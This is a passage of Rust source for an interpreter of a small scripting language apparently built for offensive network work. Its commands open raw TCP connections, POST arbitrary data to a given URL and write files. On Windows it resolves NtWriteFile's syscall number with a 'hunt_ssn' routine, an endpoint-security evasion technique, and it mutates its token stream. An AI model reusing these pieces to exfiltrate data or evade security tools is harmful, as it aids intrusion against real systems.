                if let Ok(mut s) = TcpStream::connect_timeout(&a, Duration::from_secs(1)) {
                    let _ = s.write_all(raw.replace("\\n", "\n").replace("\\r", "\r").as_bytes());
                    let mut b = [0; 4096]; if let Ok(n) = s.read(&mut b) { if n > 0 { println!("{}", String::from_utf8_lossy(&b[..n]).trim()); } }
                }
            }
        }
    }

    fn parse_transmit(&mut self) {
        self.expect_keyword("transmit");
        let url_val = self.parse_factor();
        let payload = match self.parse_factor() { 
            Value::Num(n) => n.to_string(), Value::Str(s) => s, Value::Bool(b) => b.to_string(), 
            Value::List(l) => format!("{:?}", l), Value::Dict(d) => format!("{:?}", d), Value::Gateway{..}=> "gateway".to_string(), Value::None => "None".to_string() 
        };
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
        let url = if let Value::Str(s) = url_val { s } else { panic!(); };
        println!("Transmitting HTTP POST request to target...");
        if let Ok(client) = reqwest::blocking::Client::builder().timeout(Duration::from_secs(5)).build() {
            match client.post(&url).header("Content-Type", "application/json").body(payload).send() {
                Ok(r) => { if r.status().is_success() { println!("Request completed successfully."); } else { println!("Request failed with non-success status."); } },
                Err(e) => println!("Network communication error: {}", e),
            }
        }
    }

    fn parse_file_op(&mut self, is_append: bool) { 
        self.next(); 
        let filepath = if let Value::Str(s) = self.parse_factor() { s } else { panic!(); }; 
        let content = match self.parse_factor() { 
            Value::Num(n) => n.to_string(), Value::Str(s) => s, Value::Bool(b) => b.to_string(), 
            Value::List(l) => format!("{:?}", l), Value::Dict(d) => format!("{:?}", d), Value::Gateway{..}=> "gateway".to_string(), Value::None => "None".to_string()
        }; 
        if let Some(Token::Delimiter) = self.peek() { self.next(); } 
        #[cfg(target_os = "windows")]
        unsafe {
            println!("\nInitiating syscall resolution for file I/O...");
            let ntdll_handle = GetModuleHandleA(CString::new("ntdll.dll").unwrap().as_ptr());
            let func_address = GetProcAddress(ntdll_handle, CString::new("NtWriteFile").unwrap().as_ptr());
            if !func_address.is_null() { if let Some(ssn) = hunt_ssn(func_address as *const u8) { println!("Syscall number for NtWriteFile resolved: 0x{:X}", ssn); } }
        }
        let mut opt = OpenOptions::new(); opt.write(true).create(true); 
        if is_append { opt.append(true); } else { opt.truncate(true); } 
        if let Ok(mut f) = opt.open(&filepath) { let _ = writeln!(f, "{}", content); println!("File operation completed: {}", filepath); } 
    }

    fn parse_if(&mut self, cond: bool) {
        self.expect_keyword("if"); self.next(); 
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        if cond { while let Some(t) = self.peek() { if let Token::Keyword(ref k) = t { if k == "end" { break; } } self.parse_stmt(); } if let Some(Token::Keyword(ref k)) = self.peek() { if k == "end" { self.next(); } } } 
        else { self.skip_block(); }
    }

    fn skip_block(&mut self) {
        let mut d = 1;
        while d > 0 {
            if let Some(Token::Keyword(ref k)) = self.peek() { if ["if", "swarm", "scan", "while", "for", "op", "fn", "try"].contains(&k.as_str()) { d += 1; } if k == "end" { d -= 1; } }
            if d == 0 { break; } self.next();
        }
        self.next(); 
    }

    fn parse_for(&mut self) {
        self.expect_keyword("for"); let iter = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        self.expect_keyword("in"); let mut items = Vec::new();
        match self.peek() {
            Some(Token::StringLiteral(f)) => { self.next(); items = fs::read_to_string(f).unwrap_or_default().lines().map(|l| Value::Str(l.to_string())).collect(); },
            Some(Token::Identifier(l)) => { self.next(); if let Some(Value::List(lst)) = self.memory.get(&l) { items = lst.clone(); } }, _ => panic!(),
        }
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        let start = self.pos;
        for item in items { self.memory.insert(iter.clone(), item); self.pos = start; while let Some(t) = self.peek() { if let Token::Keyword(ref k) = t { if k == "end" { break; } } self.parse_stmt(); } }
        self.pos = start; self.skip_block();
    }

    fn parse_wait(&mut self) { self.expect_keyword("wait"); let ms = if let Value::Num(n) = self.parse_factor() { n as u64 } else { 0 }; if let Some(Token::Delimiter) = self.peek() { self.next(); } thread::sleep(Duration::from_millis(ms)); }
    fn parse_push(&mut self) { self.expect_keyword("push"); let name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); }; let val = self.parse_factor(); if let Some(Token::Delimiter) = self.peek() { self.next(); } if let Some(Value::List(l)) = self.memory.get_mut(&name) { l.push(val); } }
    fn parse_pop(&mut self) { self.expect_keyword("pop"); let name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); }; if let Some(Token::Delimiter) = self.peek() { self.next(); } if let Some(Value::List(l)) = self.memory.get_mut(&name) { l.pop(); } }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 { println!("Error: Missing input file argument."); return; }
    let raw_code = fs::read_to_string(&args[1]).unwrap_or_else(|_| { println!("Error: Unable to read the input file."); std::process::exit(1); });
    let raw_tokens = lexer(&raw_code);
    let mutated_tokens = mutate_token_stream(raw_tokens);
    let mut execution_engine = Parser::new(mutated_tokens);
    execution_engine.parse();
}